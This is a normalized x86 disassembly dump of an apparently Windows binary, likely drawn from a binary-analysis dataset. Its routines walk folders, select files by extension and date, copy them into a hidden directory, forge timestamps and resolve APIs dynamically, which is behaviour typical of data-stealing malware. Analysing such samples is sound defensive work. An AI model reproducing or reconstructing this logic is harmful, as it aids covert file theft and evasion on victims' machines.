lea ebx [ ebx + ecx + 0x1 ]
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax + ebx ] 0x30
jne r-xdata
pop ebp
mov eax [ rw-data ]
inc ebx
cmp ebx eax
jl r-xdata
sub_404cf0
mov edx [ rw-data ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
push eax
push edx
call [ rename@IAT ]
add esp 0x8
neg eax
sbb al al
and al 0xf6
add al 0x4f
mov [ rw-data ] al
call sub_405230
pop edi
retn
sub_404d30
push ecx
mov edx [ rw-data ]
push ebx
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi edx
push edx
mov bl [ ecx + edx + 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi edx
mov al [ ecx + edx + 0x2 ]
or ecx 0xffffffff
mov [ esp + 0xe ] al
xor eax eax
[ edi ]
not ecx
dec ecx
mov cl [ ecx + edx + 0x3 ]
mov [ esp + 0xf ] cl
call [ GetFileAttributesA@IAT ]
mov cl 0x31
pop edi
cmp bl cl
pop ebx
jne r-xdata
and al 0xfe
or al 0x1
jmp r-xdata
and al 0xfd
or al 0x2
jmp r-xdata
cmp [ esp + 0x2 ] cl
jne r-xdata
and al 0xfb
or al 0x4
jmp r-xdata
cmp [ esp + 0x3 ] cl
jne r-xdata
mov edx [ rw-data ]
push eax
push edx
call [ SetFileAttributesA@IAT ]
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_405230
pop ecx
retn
sub_404de0
mov eax [ rw-data ]
push 0x0
push 0x2
push 0x2
push 0x0
push 0x0
push 0x40000000
push eax
call [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov [ rw-data ] 0x45
push eax
call [ rw-data ]
mov [ rw-data ] 0x4f
jmp r-xdata
jmp sub_405230
sub_404e20
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub esp 0x210
mov edx ecx
shr ecx 0x2
push ebx
push ebp
push esi
push edi
mov esi eax
lea edi [ esp + 0x20 ]
[ edi ] [ esi ]
mov ecx edx
push 0x5c
and ecx 0x3
push eax
[ edi ] [ esi ]
mov esi [ strrchr@IAT ]
call esi
push eax
call sub_4050f0
lea eax [ esp + 0x2c ]
push 0x5c
push eax
call esi
add esp 0x14
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
sub edi ecx
push 0x7d00
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov [ esp + 0x1c ] 0x42
and ecx 0x3
[ edi ] [ esi ]
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov [ eax + 0x1 ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
lea eax [ esp + 0x20 ]
push eax
call sub_405070
mov esi eax
add esp 0x4
cmp esi 0xffffffff
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
test esi esi
jne r-xdata
lea ecx [ esi + esi * 4 ]
lea edx [ esp + 0x18 ]
shl ecx 0x6
add ecx 0x5
push 0x5
push edx
mov [ esp + 0x21 ] ecx
call sub_402970
add esp 0x8
lea eax [ esp + 0x20 ]
push ebx
push eax
call [ rw-data ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov esi 0x1
push ebx
call sub_405150
add esp 0x4
test eax eax
je r-xdata
or ecx eax
mov edi rw-data
xor eax eax
lea edx [ ebx + 0x2c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
push ebx
push 0x140
push ebx
call sub_403800
push 0x140
push ebx
call sub_4028b0
push ebx
call [ free@IAT ]
add esp 0x1c
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
xor ebp ebp
dec esi
test esi esi
mov [ esp + 0x10 ] esi
jle r-xdata
lea edx [ esp + 0x14 ]
push edx
push ebx
push 0x140
push ebx
call sub_403800
push 0x140
push ebx
call sub_4028b0
add esp 0x18
test eax eax
je r-xdata
push edi
call [ FindClose@IAT ]
push ebx
push edi
call sub_405010
add esp 0x8
cmp eax 0xffffffff
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
push edi
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
add ebp eax
lea esi [ eax + eax * 4 ]
lea eax [ esp + 0x14 ]
shl esi 0x6
push eax
push ebx
push esi
push ebx
call sub_403800
push esi
push ebx
call sub_4028b0
add esp 0x18
test eax eax
je r-xdata
cmp ebp [ esp + 0x10 ]
jl r-xdata
sub_405010
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov edi [ esp + 0x14 ]
xor esi esi
push edi
push ebx
call [ rw-data ]
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn
push edi
call sub_405150
add esp 0x4
test eax eax
je r-xdata
cmp esi 0x64
jge r-xdata
inc esi
add edi 0x140
push edi
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
sub_405070
mov ecx [ esp + 0x4 ]
sub esp 0x140
lea eax [ esp ]
push esi
push edi
push eax
push ecx
xor edi edi
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax edi
pop edi
pop esi
add esp 0x140
retn
lea edx [ esp + 0x8 ]
push edx
call sub_405150
add esp 0x4
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
inc edi
push esi
call [ FindClose@IAT ]
pop edi
or eax 0xffffffff
pop esi
add esp 0x140
retn
lea eax [ esp + 0x8 ]
push eax
push esi
call [ rw-data ]
test eax eax
je r-xdata
push esi
call [ FindClose@IAT ]
jmp r-xdata
sub_4050f0
mov edx [ esp + 0x4 ]
mov [ rw-data ] 0x0
test edx edx
je r-xdata
retn
push ebx
mov ebx [ strchr@IAT ]
push esi
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x2
jb r-xdata
mov [ edx ] 0x0
test edx edx
jne r-xdata
mov eax [ rw-data ]
mov [ eax * 4 + rw-data ] esi
inc eax
mov [ rw-data ] eax
lea esi [ edx + 0x1 ]
push 0x3b
push esi
call ebx
mov edx eax
add esp 0x8
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
sub_405150
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
test [ ebp ] 0x10
je r-xdata
add ebp 0x2c
push 0x2e
push ebp
call [ strrchr@IAT ]
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
add esp 0x8
mov [ esp + 0x18 ] 0x0
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov ebx rw-data
mov eax [ esp + 0x18 ]
mov ecx [ rw-data ]
inc eax
add ebx 0x4
cmp eax ecx
mov [ esp + 0x18 ] eax
jl r-xdata
mov esi [ lstrcmpiA@IAT ]
push rw-data
push edx
call esi
test eax eax
je r-xdata
mov edx [ ebx ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x2
jb r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ ebx ]
push rw-data
push ecx
call esi
test eax eax
je r-xdata
mov eax [ ebx ]
or ecx 0xffffffff
lea edx [ eax + 0x2 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
mov esi ecx
je r-xdata
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push edx
sub ecx esi
lea eax [ ecx + ebp ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
sub_405260
mov eax [ rw-data ]
sub esp 0x844
test eax eax
push ebx
push ebp
push esi
push edi
je r-xdata
mov ebx [ esp + 0x858 ]
lea eax [ esp + 0x654 ]
push ebx
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x654 ]
push ecx
push edx
call [ rw-data ]
mov ebp [ esp + 0x85c ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn
cmp ebp 0x4c
jne r-xdata
mov esi [ esp + 0x10 ]
lea eax [ esp + 0x14 ]
push eax
push esi
call [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x844
retn
push ebx
call [ RemoveDirectoryA@IAT ]
push esi
call [ FindClose@IAT ]
cmp [ esp + 0x40 ] 0x2e
je r-xdata
lea edi [ esp + 0x40 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x354 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov al [ esp + 0x14 ]
and ecx 0x3
test al 0x10
[ edi ] [ esi ]
je r-xdata
lea eax [ esp + 0x354 ]
lea ecx [ esp + 0x154 ]
push eax
push ebx
push rw-data
push ecx
call [ sprintf@IAT ]
lea eax [ ebp - 0x4c ]
add esp 0x10
cmp eax 0xd
ja r-xdata
lea ecx [ esp + 0x354 ]
lea edx [ esp + 0x454 ]
push ecx
push ebx
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0x10
cmp ebp 0x4e
jl r-xdata
xor edx edx
mov dl [ eax + lookup_table_40555c ]
jmp [ edx * 4 + jump_table_40554c ]
lea edx [ esp + 0x454 ]
push ebp
push edx
call sub_405260
add esp 0x8
test eax eax
je r-xdata
cmp ebp 0x4f
jg r-xdata
lea eax [ esp + 0x154 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
lea ecx [ esp + 0x154 ]
push ecx
call [ rw-data ]
jmp r-xdata
lea edx [ esp + 0x154 ]
push 0x44
push edx
call sub_4058c0
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x14 ]
push edx
call sub_405150
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn
jmp r-xdata
lea eax [ esp + 0x454 ]
push 0x46
push eax
call sub_4058c0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn
mov eax [ rw-data ]
push 0xea60
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x154 ]
push eax
push ecx
call sub_405bf0
add esp 0x8
jmp r-xdata
mov ecx [ rw-data ]
push 0xea60
push ecx
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
mov eax [ esp + 0x10 ]
push eax
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn
cmp ebp 0x4f
jne r-xdata
lea ecx [ esp + 0x154 ]
push ecx
push 0x0
call sub_405930
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
push ecx
lea eax [ esp + 0x158 ]
push edx
push eax
call sub_405ca0
add esp 0xc
test eax eax
je r-xdata
mov edx [ rw-data ]
push 0xea60
push edx
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
cmp ebp 0x4f
jne r-xdata
lea eax [ esp + 0x154 ]
push 0x0
push eax
call [ rw-data ]
lea ecx [ esp + 0x154 ]
push ecx
call [ rw-data ]
jmp r-xdata
sub_405570
sub esp 0x200
mov [ rw-data ] 0x4f
push edi
call sub_405230
mov edx [ rw-data ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
cmp [ edx + ecx - 0x2 ] 0x3a
jne r-xdata
push ebx
push esi
lea eax [ esp + 0xc ]
push 0x200
push eax
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ CreateDirectoryA@IAT ]
lea ecx [ esp + 0xc ]
push ecx
call [ GetFileAttributesA@IAT ]
or al 0x2
lea edx [ esp + 0xc ]
push eax
push edx
call [ rw-data ]
mov ecx [ rw-data ]
lea eax [ esp + 0xc ]
push eax
push ecx
call sub_405630
add esp 0x8
pop esi
pop ebx
cmp [ edx + ecx - 0x1 ] 0x5c
je r-xdata
pop edi
add esp 0x200
retn
sub_405630
mov eax [ rw-data ]
sub esp 0xe54
test eax eax
push ebx
push ebp
push esi
push edi
je r-xdata
mov eax [ esp + 0xe68 ]
mov ebp [ sprintf@IAT ]
push eax
lea ecx [ esp + 0x868 ]
push rw-data
push ecx
call ebp
add esp 0xc
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x864 ]
push edx
push eax
call [ rw-data ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xe54
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xe54
retn
mov ebx [ esp + 0xe6c ]
push esi
call [ FindClose@IAT ]
cmp [ esp + 0x50 ] 0x2e
je r-xdata
mov esi [ esp + 0x10 ]
lea ecx [ esp + 0x24 ]
push ecx
push esi
call [ rw-data ]
test eax eax
je r-xdata
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x164 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov al [ esp + 0x24 ]
and ecx 0x3
test al 0x10
[ edi ] [ esi ]
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
call [ GetLocalTime@IAT ]
mov eax [ esp + 0x1e ]
mov edx [ rw-data ]
mov ecx [ esp + 0x1c ]
and eax 0xffff
push edx
mov edx [ esp + 0x1e ]
push eax
mov eax [ esp + 0x1e ]
and ecx 0xffff
and edx 0xffff
push ecx
and eax 0xffff
push edx
push eax
lea ecx [ esp + 0x278 ]
push rw-data
push ecx
call ebp
mov eax [ rw-data ]
add esp 0x1c
mov edx eax
inc eax
cmp edx 0x1869f
mov [ rw-data ] eax
jle r-xdata
mov ecx [ rw-data ]
lea edx [ esp + 0x364 ]
push ecx
push rw-data
push edx
call ebp
mov eax [ rw-data ]
add esp 0xc
mov ecx eax
inc eax
cmp ecx 0x1869f
mov [ rw-data ] eax
jle r-xdata
lea eax [ esp + 0x164 ]
push 0x2e
push eax
call [ strrchr@IAT ]
mov edx [ esp + 0xe70 ]
lea ecx [ esp + 0x16c ]
mov esi eax
push ecx
push edx
lea eax [ esp + 0xc74 ]
push rw-data
push eax
call ebp
add esp 0x18
test esi esi
jne r-xdata
mov [ rw-data ] 0x0
mov eax [ esp + 0xe68 ]
lea edx [ esp + 0x164 ]
push edx
push eax
lea ecx [ esp + 0xa6c ]
push rw-data
push ecx
call ebp
lea edx [ esp + 0x374 ]
lea eax [ esp + 0x474 ]
push edx
push ebx
push rw-data
push eax
call ebp
add esp 0x20
lea ecx [ esp + 0x464 ]
push 0x0
push ecx
call [ CreateDirectoryA@IAT ]
lea edx [ esp + 0x464 ]
lea eax [ esp + 0xa64 ]
push edx
push eax
call sub_405630
add esp 0x8
test eax eax
je r-xdata
mov [ rw-data ] 0x0
inc esi
lea eax [ esp + 0x264 ]
push esi
push eax
push ebx
lea ecx [ esp + 0x670 ]
push rw-data
push ecx
call ebp
add esp 0x14
lea ecx [ esp + 0x264 ]
lea edx [ esp + 0x664 ]
push ecx
push ebx
push rw-data
push edx
call ebp
add esp 0x10
jmp r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xe54
retn
jmp r-xdata
lea edx [ esp + 0x664 ]
push 0x0
lea eax [ esp + 0xc68 ]
push edx
push eax
call [ CopyFileA@IAT ]
jmp r-xdata
sub_4058c0
sub esp 0x400
push ebx
push esi
mov esi [ esp + 0x40c ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
lea ebx [ esp + 0x11 ]
[ edi ]
mov al [ esp + 0x414 ]
mov edi esi
not ecx
dec ecx
mov [ esp + 0xc ] al
mov edx ecx
or ecx 0xffffffff
xor eax eax
add edx 0x6
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0xd ] edx
mov eax ecx
mov esi edi
mov edi ebx
push edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
call sub_402970
add esp 0x8
pop edi
pop esi
pop ebx
add esp 0x400
retn
sub_405930
mov eax 0x2008
call sub_4076c0
mov eax [ rw-data ]
mov [ esp ] 0x1
cmp eax 0x53
je r-xdata
mov [ esp + 0x8 ] 0x53
cmp eax 0x59
sete al
dec eax
and al 0xec
add eax 0x59
mov [ esp + 0x8 ] al
jmp r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ebx [ esp + 0x201c ]
mov edx 0x5
sub edx ebx
push esi
add eax edx
mov [ esp + 0x1d ] eax
call [ rw-data ]
lea eax [ esp + 0x18 ]
push 0x5
push eax
call sub_402970
add esp 0x8
test eax eax
jne r-xdata
cmp [ esp + 0x18 ] 0x59
jne r-xdata
push ebx
push ebp
mov ebp [ esp + 0x2018 ]
push esi
push edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x3
push 0x80000000
push ebp
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push ebp
call [ fopen@IAT ]
mov edi eax
push 0x0
push ebx
push edi
call [ fseek@IAT ]
mov eax [ rw-data ]
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2008
retn
mov [ rw-data ] 0x55
call sub_405230
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2008
retn
lea ecx [ esp + 0x18 ]
push 0x6
push ecx
mov [ esp + 0x21 ] 0x6
call sub_402970
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2008
retn
mov [ esp + 0x10 ] 0x0
mov ebx [ fread@IAT ]
cmp esi 0x2000
jne r-xdata
cmp [ rw-data ] 0x41
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
call [ fclose@IAT ]
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2008
retn
push edi
call [ fclose@IAT ]
add esp 0x4
push 0x0
push ebp
call [ rw-data ]
push ebp
call [ rw-data ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x2008
retn
push edi
push 0x2000
lea ecx [ esp + 0x20 ]
push 0x1
push ecx
call ebx
mov esi eax
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x28 ]
push edx
push eax
lea ecx [ esp + 0x30 ]
push 0x2000
push ecx
call sub_403800
lea edx [ esp + 0x38 ]
push esi
push edx
call sub_4028b0
add esp 0x28
test eax eax
je r-xdata
sub_405b10
mov eax [ rw-data ]
push 0x46
push eax
call sub_4058c0
mov ecx [ rw-data ]
add esp 0x8
push 0xea60
push ecx
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
retn
mov edx [ esp + 0x4 ]
mov eax [ rw-data ]
push edx
push eax
call sub_405260
add esp 0x8
mov [ rw-data ] 0x47
jmp sub_405230
sub_405b60
push esi
push edi
push 0xff
push rw-data
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ rw-data ]
mov eax [ rw-data ]
push 0x5c
push eax
call [ strrchr@IAT ]
mov esi eax
push esi
call sub_4050f0
mov [ esi ] 0x0
mov ecx [ rw-data ]
push 0x59
push ecx
call sub_405260
push rw-data
push 0x0
call sub_405930
add esp 0x1c
push rw-data
call [ rw-data ]
pop edi
pop esi
retn
sub_405bf0
push esi
push rw-data
push rw-data
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop esi
retn
mov edx [ esp + 0x8 ]
push ebx
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov edi [ fwrite@IAT ]
push esi
not ecx
push ecx
push 0x1
push edx
call edi
mov ebx [ esp + 0x24 ]
push esi
push 0x8
push 0x1
lea eax [ ebx + 0x14 ]
push eax
call edi
push esi
push 0x4
add ebx 0x20
push 0x1
push ebx
call edi
push esi
call [ fclose@IAT ]
add esp 0x34
pop edi
pop ebx
sub_405c50
mov eax [ rw-data ]
push esi
push edi
push 0x200
push eax
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x4f
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ rw-data ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call sub_405b10
add esp 0x4
pop edi
pop esi
retn
sub_405ca0
sub esp 0x18
push ebx
push ebp
mov ebp [ esp + 0x24 ]
push esi
push edi
push 0x2e
push ebp
call [ strrchr@IAT ]
mov edi [ lstrcmpiA@IAT ]
add esp 0x8
mov ebx eax
mov esi rw-data
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x18
retn
test ebx ebx
je r-xdata
push rw-data
push esi
call edi
test eax eax
je r-xdata
lea eax [ esi + 0x2 ]
lea ecx [ ebx + 0x1 ]
push eax
push ecx
call edi
test eax eax
je r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x3
push 0x80000000
push ebp
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
add esi 0x10
cmp esi rw-data
jl r-xdata
jmp r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
push esi
mov edi eax
call [ rw-data ]
cmp edi 0x7d0
jb r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp edi 0xf4240
ja r-xdata
push rw-data
push ebp
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x18 ]
push edx
call [ GetSystemTime@IAT ]
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
call [ SystemTimeToFileTime@IAT ]
mov ebp [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
add ebp 0xd8a14000
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x30 ]
push edx
adc ebx 0xfffff5c8
push eax
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] ebx
call [ CompareFileTime@IAT ]
xor ecx ecx
pop edi
test eax eax
setge cl
pop esi
pop ebp
mov eax ecx
pop ebx
add esp 0x18
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x18
retn
sub_405dd0
mov eax [ rw-data ]
sub esp 0x104
test eax eax
push ebx
push esi
push edi
jne r-xdata
push rw-data
push rw-data
call [ fopen@IAT ]
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
mov eax [ rw-data ]
or ecx 0xffffffff
mov [ rw-data ] 0x1
lea edx [ eax + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
mov ebx ecx
cmp ebx 0x114
jae r-xdata
mov esi [ rw-data ]
mov eax [ rw-data ]
push eax
call [ fclose@IAT ]
add esp 0x4
mov [ rw-data ] 0x45
call sub_405230
pop edi
pop esi
pop ebx
add esp 0x104
retn
pop edi
pop esi
pop ebx
add esp 0x104
retn
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax [ rw-data ]
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
cmp eax 0x56
[ edi ] [ esi ]
jne r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x4f
call sub_405230
push rw-data
call sub_405ff0
mov eax [ rw-data ]
add esp 0x4
cmp eax 0x56
jne r-xdata
push 0x0
push rw-data
call [ rw-data ]
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
lea eax [ esp + 0x10 ]
push 0x100
push eax
call [ rw-data ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push rw-data
call sub_406c10
add esp 0x4
push rw-data
push rw-data
jmp r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
sub eax ebx
lea esi [ edx + ebx + 0x5 ]
sub eax 0x5
jmp r-xdata
mov [ rw-data ] 0x45
call sub_405230
pop edi
pop esi
pop ebx
add esp 0x104
retn
push rw-data
call [ fopen@IAT ]
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0xc ] eax
push ecx
push esi
push eax
push esi
call sub_403800
mov edx [ esp + 0x1c ]
push edi
push edx
push 0x1
push esi
call [ fwrite@IAT ]
push edi
call [ fclose@IAT ]
mov eax [ rw-data ]
add esp 0x24
test eax eax
je r-xdata
sub_405ff0
sub esp 0x408
lea eax [ esp + 0x8 ]
push ebx
push esi
push edi
push 0x400
push eax
call [ rw-data ]
push 0x0
push 0x2000000
push 0x3
push 0x0
push 0x5
lea ecx [ esp + 0x28 ]
push 0x80000000
push ecx
call [ rw-data ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x408
retn
mov ebx [ esp + 0x418 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x40000000
push ebx
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push 0x0
lea edx [ esp + 0x10 ]
push 0x0
push edx
push edi
call [ GetFileTime@IAT ]
lea eax [ esp + 0xc ]
lea ecx [ esp + 0xc ]
push eax
lea edx [ esp + 0x10 ]
push ecx
push edx
push esi
call [ SetFileTime@IAT ]
push edi
call [ rw-data ]
push esi
call [ rw-data ]
push ebx
call [ GetFileAttributesA@IAT ]
or al 0x2
push eax
push ebx
call [ rw-data ]
push edi
call [ rw-data ]
pop edi
pop esi
pop ebx
add esp 0x408
retn
sub_4060c0
sub esp 0x4c4
mov ecx [ esp + 0x4c8 ]
lea eax [ esp + 0x4 ]
push eax
push 0x20008
push ecx
mov [ esp + 0x14 ] 0x100
mov [ esp + 0xc ] 0xc8
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
push edx
lea eax [ esp + 0xe0 ]
push 0x3e8
push eax
push 0x1
push ecx
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
add esp 0x4c4
retn
lea edx [ esp + 0x10 ]
lea eax [ esp ]
push edx
lea ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x4d4 ]
lea edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0xe8 ]
push edx
push eax
push ecx
push 0x0
call [ LookupAccountSidA@IAT ]
neg eax
sbb eax eax
neg eax
add esp 0x4c4
retn
add esp 0x4c4
retn
sub_406160
mov eax 0x4240
call sub_4076c0
push ebx
push ebp
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
xor ebp ebp
cmp edi ebp
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4240
retn
mov ebx [ GetProcAddress@IAT ]
push rw-data
push edi
call ebx
push rw-data
push edi
mov [ esp + 0x18 ] eax
call ebx
mov esi eax
push edi
mov [ esp + 0x28 ] esi
call [ FreeLibrary@IAT ]
cmp [ esp + 0x10 ] ebp
je r-xdata
cmp esi ebp
je r-xdata
mov eax 0x2
push rw-data
mov [ esp + 0x30 ] eax
mov [ esp + 0x3c ] eax
mov eax [ rw-data ]
